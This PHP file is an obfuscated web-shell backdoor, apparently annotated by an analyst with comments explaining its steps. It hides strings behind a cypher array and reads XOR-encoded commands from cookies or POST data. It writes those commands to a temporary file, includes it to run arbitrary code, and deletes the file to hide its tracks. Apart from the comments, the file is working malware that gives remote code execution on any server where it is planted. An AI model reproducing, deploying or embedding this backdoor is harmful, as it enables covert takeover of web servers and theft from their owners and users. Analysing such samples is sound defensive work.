<?php
function j1($s2){
	$cypher = "- m64/_byhg7l?dskLE3)@rH#'(avun8Ic;e.F" ."<*1o5pt09fix" ; # This is what the cypher_array below references to obfuscate code
	$q5='';foreach($s2 as $w4){$q5.=$cypher[$w4];}return $q5;
}

$cypher_array = Array();
$cypher_array[] = j1(Array(19,42,31,47,3,4,14,3,0,14,42,14,42,0,4,3,3,40,0,27,46,11,19,0,46,7,14,40,4,33,7,45,7,42,42,46));
$cypher_array[] = j1(Array(13,43,9,43,1,21,29,30,12,48,30,16,26,6,6,37,32,17,18,6,6,20,34,1));
$cypher_array[] = j1(Array(36,2,41,14,29,12,35));
$cypher_array[] = j1(Array(23,39));
$cypher_array[] = j1(Array(36,5));
$cypher_array[] = j1(Array(24));
$cypher_array[] = j1(Array(38));
$cypher_array[] = j1(Array(47,48,12,35,6,43,29,44,6,33,41,30,44,35,30,44,15));
$cypher_array[] = j1(Array(27,22,22,27,8,6,2,35,22,10,35));
$cypher_array[] = j1(Array(15,44,22,6,22,35,43,35,27,44));
$cypher_array[] = j1(Array(35,49,43,12,41,14,35));
$cypher_array[] = j1(Array(15,29,7,15,44,22));
$cypher_array[] = j1(Array(29,30,12,48,30,16));
$cypher_array[] = j1(Array(15,44,22,12,35,30));
$cypher_array[] = j1(Array(43,27,33,16));
$cypher_array[] = j1(Array(2,14,42));

# this loop checks each cookie / post submitted with the request and check it for instructions
foreach (array_merge($_COOKIE, $_POST) as $key => $value){
	
	if(!function_exists('x8')){
		function x8($cypher_array, $key, $t10){
			return substr(str_repeat($key . '358f64d6-d5d5-4661-a973-9bd14cb0b559', ($t10 / strlen($key)) + 1), 0, $t10);
		}
	}
	
	if(!function_exists('x7')){	function x7($cypher_array, $i12){return @pack('H*', $i12);} }
	
	if(!function_exists('n9')){	
		function n9($cypher_array, $i12){
			if (isset($i12[2])){ 
				$a13 = './' . md5('358f64d6-d5d5-4661-a973-9bd14cb0b559') . '.module';
				@file_put_contents($a13,' <' . "?php @unlink(__FILE__);" . /*This is where code is executed*/$i12[1]($i12[2])/*This is where code is executed*/);
				@include($a13);
				@unlink($a13); # This deletes the file to cover it's tracks
				exit();
			}
		}
	}
	
	$value = x7($cypher_array, $value);
	
	# This attempts to run the n9 function above which checks to see if a post/cookie exists and then creats a temporary file that it executes.
	n9($cypher_array, explode('#', $value ^ x8($cypher_array, $key, strlen($value))));
}
